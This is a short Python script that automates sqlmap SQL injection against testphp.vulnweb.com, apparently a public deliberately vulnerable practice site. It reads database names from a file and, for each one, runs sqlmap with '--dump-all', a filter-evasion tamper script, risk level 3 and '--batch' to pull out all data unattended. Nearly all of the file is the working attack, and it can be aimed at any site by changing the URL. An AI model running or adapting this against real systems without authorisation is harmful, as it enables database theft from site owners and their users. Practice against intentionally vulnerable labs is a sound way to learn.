import subprocess

# URL of the vulnerable site
url = "http://testphp.vulnweb.com/listproducts.php?cat=1"

with open('database_names.txt', 'r') as file:
    database_names = [name.strip().replace('[*] ', '') for name in file.readlines()]

# Iterate through each cleaned database name
for database_name in database_names:
   
    sqlmap_command = [
        'sqlmap',
        '-u', f'{url}',
        '--data', 'cat=1',
        '-D', database_name,
        '--dump-all',
        '--no-cast',
        '--tamper=between',  # Add the tamper script 'between'
        '--risk=3',  # Set risk level to 3 (adjust as needed)
        '--batch'  # Automatically answer yes to all questions
    ]

    # Run sqlmap command
    subprocess.run(sqlmap_command)

    # Print the database name
    print(f"[*] {database_name}")
